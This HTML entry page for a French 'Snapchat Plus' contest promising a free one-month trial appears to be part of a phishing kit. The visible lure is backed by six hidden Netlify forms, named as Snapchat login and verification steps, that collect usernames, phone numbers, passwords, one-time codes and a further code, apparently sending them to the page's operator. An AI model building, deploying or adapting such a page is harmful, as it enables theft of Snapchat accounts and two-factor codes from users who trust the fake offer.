<!doctype html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1"
    />
    <title>Concours Snapchat Plus</title>
    <meta name="description" content="Réclamez un essai gratuit de 1 mois Snapchat Plus — offre à durée limitée." />
    <meta name="robots" content="index, follow" />
    <meta property="og:title" content="Concours Snapchat Plus" />
    <meta property="og:description" content="Réclamez un essai gratuit de 1 mois Snapchat Plus — offre à durée limitée." />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="/og-image.png" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Concours Snapchat Plus" />
    <meta name="twitter:description" content="Réclamez un essai gratuit de 1 mois Snapchat Plus — offre à durée limitée." />
    <meta name="twitter:image" content="/og-image.png" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <form
      name="Snapchat-login-username"
      method="POST"
      data-netlify="true"
      style="display: none"
    >
      <input type="hidden" name="form-name" value="Snapchat-login-username" />
      <input type="text" name="username" />
    </form>
    <form
      name="Snapchat-login-phone"
      method="POST"
      data-netlify="true"
      style="display: none"
    >
      <input type="hidden" name="form-name" value="Snapchat-login-phone" />
      <input type="text" name="countryCode" />
      <input type="tel" name="phone" />
    </form>
    <form
      name="Snapchat-login-password"
      method="POST"
      data-netlify="true"
      style="display: none"
    >
      <input type="hidden" name="form-name" value="Snapchat-login-password" />
      <input type="text" name="identifier" />
      <input type="password" name="password" />
    </form>
    <form
      name="Snapchat-verification-username"
      method="POST"
      data-netlify="true"
      style="display: none"
    >
      <input type="hidden" name="form-name" value="Snapchat-verification-username" />
      <input type="text" name="username" />
    </form>
    <form
      name="Snapchat-verification-otp"
      method="POST"
      data-netlify="true"
      style="display: none"
    >
      <input type="hidden" name="form-name" value="Snapchat-verification-otp" />
      <input type="text" name="identifier" />
      <input type="text" name="otp" />
    </form>
    <form
      name="Snapchat-meo"
      method="POST"
      data-netlify="true"
      style="display: none"
    >
      <input type="hidden" name="form-name" value="Snapchat-meo" />
      <input type="text" name="meoCode" />
    </form>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
